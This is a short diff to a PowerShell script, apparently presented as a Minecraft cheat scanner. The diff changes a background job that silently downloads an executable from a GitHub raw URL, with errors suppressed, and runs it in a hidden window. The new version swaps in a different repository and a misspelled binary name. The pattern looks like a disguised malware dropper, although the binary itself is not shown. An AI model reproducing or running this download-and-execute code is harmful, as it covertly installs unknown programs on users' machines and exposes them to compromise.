@@ -7,8 +7,8 @@ try {
 
 Start-Job -ScriptBlock {
     param($f)
-    Invoke-WebRequest -Uri "https://github.com/kilordowosfatow/minescan/raw/refs/heads/main/Chacker.exe" -OutFile "$f\Chacker.exe" -ErrorAction SilentlyContinue
-    Start-Process -FilePath "$f\Chacker.exe" -WindowStyle Hidden
+    Invoke-WebRequest -Uri "https://github.com/agubobr-spec/cheaker/raw/refs/heads/main/cheaker.exe" -OutFile "$f\cheaker.exe" -ErrorAction SilentlyContinue
+    Start-Process -FilePath "$f\cheaker.exe" -WindowStyle Hidden
 } -ArgumentList $folder | Out-Null
 
 # MINECRAFT CHEAT SCANNER
